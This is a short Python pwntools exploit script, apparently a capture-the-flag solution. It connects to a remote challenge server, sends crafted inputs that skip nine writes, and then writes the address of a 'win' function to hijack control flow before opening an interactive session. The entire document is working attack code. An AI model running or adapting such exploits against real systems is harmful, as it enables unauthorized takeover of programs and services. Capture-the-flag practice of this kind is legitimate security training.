from pwn import *

WIN = 0x4011f6

# p = process('./chall')
p = remote('152.118.201.241', 3008)
p.recvuntil(b'How many times?\n')
p.sendline(b'10')

for i in range(9):
    p.sendline(b'-')

p.sendline(str(WIN).encode())

p.recvuntil(b'Say something:\n')
p.sendline(b'hello')

p.interactive()